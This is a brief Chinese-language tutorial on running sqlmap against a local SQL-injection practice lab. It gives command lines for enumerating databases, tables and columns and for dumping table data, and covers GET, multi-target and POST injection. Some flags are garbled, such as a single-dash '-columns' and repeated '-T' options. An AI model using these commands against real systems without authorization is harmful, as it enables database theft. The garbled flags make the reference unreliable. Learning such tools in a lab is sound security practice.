# sqlmap的使用

sql注入（get型）

---
python sqlmap.py -u http://127.0.0.1/sqli/less-1/?id=1

python sqlmap.py -u http://127.0.0.1/sqli/less-1/?id=1&page=10 -p page

python sqlmap.py -u http://127.0.0.1/sqli/less-1/?id=1&page=10 -p page -batch

<font color="DeepSkyBlue">**-u:指定URL**</font>

<font color="DeepSkyBlue">**-p:指定注入点**</font>

<font color="DeepSkyBlue">**-batch自动化测试，需要选择全部默认Y（注入过程可能比较久）:**</font>

    http://127.0.0.1/sqli/less-1/?id=1 --dbs
    
    --dbs:获取数据库名字
    
    ----------------------------------------------
    
    http://127.0.0.1/sqli/less-1/?id=1 -D security --tables
    
    --tables:获取数据库名
    -D指定数据库
    
     ---------------------------------------------
     
     http://127.0.0.1/sqli/less-1/?id=1 -D security -T user -columns
     
    --columns:获取字段名
    -T指定表名
    
     ---------------------------------------------
     
      http://127.0.0.1/sqli/less-1/?id=1 -D security -T user -T security -T user -C id,--dump
      
    --dump:获取数据（拖库（无授权情况下禁止使用））
    -C指定列名

---
###多目标测试（get型）
    python sqlmap.py -m test.txt
    
    -m:指定目标文件
    
    首先要创建好指定URL写入txt文档中

---

测试POST型注入

    python sqlmap.py -r test.txt
    -r:指定要测试的数据包

